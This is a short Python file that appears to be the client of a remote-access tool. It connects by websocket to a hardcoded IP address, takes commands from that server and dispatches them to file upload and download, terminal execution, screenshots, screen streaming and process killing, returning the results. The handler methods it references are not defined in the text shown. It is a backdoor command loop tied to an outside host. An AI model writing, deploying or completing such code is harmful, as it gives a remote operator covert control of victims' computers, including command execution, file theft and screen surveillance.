import json
import websockets

SERVER_WS_URL = "ws://8.210.69.51:9876/"


class Client:
    def _dispatch(self, name, args):
        H = {
            "file.ls": self._h_ls,
            "file.upload": self._h_edit,
            "file.download": self._h_cat,
            "terminal.exec": self._h_exec,
            "screen.shot": self._h_screenshot,
            "screen.stream.start": self._h_stream,
            "process.kill": self._h_kill,
        }
        h = H.get(name)
        return h(args) if h else {"ok": False}

    async def run(self):
        async with websockets.connect(SERVER_WS_URL) as ws:
            async for raw in ws:
                cmd = json.loads(raw)
                await ws.send(json.dumps(self._dispatch(cmd["cmd"], cmd.get("args", {}))))
